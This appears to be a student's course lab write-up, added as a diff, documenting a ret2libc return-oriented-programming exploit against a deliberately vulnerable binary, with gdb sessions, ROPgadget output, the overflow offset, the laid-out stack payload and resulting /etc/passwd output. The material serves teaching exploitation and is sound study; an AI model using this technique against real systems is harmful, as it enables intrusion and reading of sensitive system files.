@@ -1,0 +1,125 @@
+Step 1: Find buffer size and address on stack of return address
+
+dtrived5@shell:~/CS-576-ROP/hw2-ret2libc$ gdb vuln_prog2.bin
+
+(gdb) break main
+Breakpoint 1 at 0x400753
+
+(gdb) run
+
+(gdb) p system
+$3 = {<text variable, no debug info>} 0x7ffff7a523a0 <__libc_system>
+
+(gdb) p _exit
+$4 = {<text variable, no debug info>} 0x7ffff7ad9790 <__GI__exit>
+
+(gdb) break *0x0000000000400781
+Breakpoint 2 at 0x400781
+
+(gdb) c
+Continuing.
+Howdy dtrived5
+
+Breakpoint 2, 0x0000000000400781 in main ()
+
+(gdb) si
+0x000000000040070f in get_text ()
+
+(gdb) disas
+
+(gdb) c
+Continuing.
+AAAABB
+
+Breakpoint 4, 0x0000000000400733 in get_text ()
+
+(gdb) x/128bx $rsp
+0x7fffffffe7e0:	0x41	0x41	0x41	0x41	0x42	0x42	0x0a	0x00 ← buffer address
+
+(gdb) si
+0x000000000040074e in get_text ()
+
+(gdb) x/128bx $rsp
+0x7fffffffe8e8:	0x86	0x07	0x40	0x00	0x00	0x00	0x00	0x00 ← return address
+
+0x7fffffffe8e8 − 0x7fffffffe7e0 = 0x108 = 264
+
+---
+
+Step 2: Find pop rdi; ret gadget
+
+dtrived5@shell:~$ git clone https://github.com/JonathanSalwan/ROPgadget.git
+
+dtrived5@shell:~$ cd ROPgadget/
+
+dtrived5@shell:~/ROPgadget$ pip install capstone
+
+dtrived5@shell:~/ROPgadget$ pip install ropgadget
+
+dtrived5@shell:~/ROPgadget$ ./ROPgadget.py --binary vuln_prog2.bin 
+Gadgets information
+============================================================
+0x00000000004007ff : pop rbp ; pop r14 ; pop r15 ; ret
+0x0000000000400630 : pop rbp ; ret
+0x0000000000400803 : pop rdi ; ret ← pop rdi; ret gadget found
+0x0000000000400801 : pop rsi ; pop r15 ; ret
+0x00000000004007fd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
+
+Unique gadgets found: 107
+dtrived5@shell:~/ROPgadget$ 
+
+---
+
+Step 3: Run exploit
+
+dtrived5@shell:~/CS-576-ROP/hw2-ret2libc$ nano exploit_3.py 
+
+dtrived5@shell:~/CS-576-ROP/hw2-ret2libc$ python3 exploit_3.py > input3
+
+dtrived5@shell:~/CS-576-ROP/hw2-ret2libc$ gdb vuln_prog2.bin
+
+(gdb) break main
+Breakpoint 1 at 0x400753
+
+(gdb) run < input3
+Starting program: /home/dtrived5/CS-576-ROP/hw2-ret2libc/vuln_prog2.bin < input3
+
+Breakpoint 1, 0x0000000000400753 in main ()
+
+(gdb) break *0x0000000000400781
+Breakpoint 2 at 0x400781
+
+(gdb) break *0x000000000040072e
+Breakpoint 3 at 0x40072e
+
+(gdb) break *0x0000000000400733
+Breakpoint 4 at 0x400733
+
+(gdb) break *0x0000000000400747
+Breakpoint 5 at 0x400747
+
+(gdb) break *0x000000000040074c
+Breakpoint 6 at 0x40074c
+
+(gdb) c
+Continuing.
+Echo:
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@
+
+Breakpoint 6, 0x000000000040074c in get_text ()
+
+(gdb) x/304bx $rsp
+0x7fffffffe8e0:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41 ← buffer end
+0x7fffffffe8e8:	0x03	0x08	0x40	0x00	0x00	0x00	0x00	0x00 ← pop rdi; ret
+0x7fffffffe8f0:	0x01	0xe9	0xff	0xff	0xff	0x7f	0x00	0x00 ← string address
+0x7fffffffe8f8:	0xa0	0x23	0xa5	0xf7	0xff	0x7f	0x00	0x00 ← system address
+0x7fffffffe900:	0x2f	0x2f	0x62	0x69	0x6e	0x2f	0x63	0x61 ← string
+
+(gdb) c
+Continuing.
+root:x:0:0:root:/root:/bin/bash
+monitoring:x:450:450:monitoring:/home/monitoring:/usr/sbin/nologin
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007ffff7a520ae in do_system (line=<optimized out>) at ../sysdeps/posix/system.c:174
+174	../sysdeps/posix/system.c: No such file or directory.
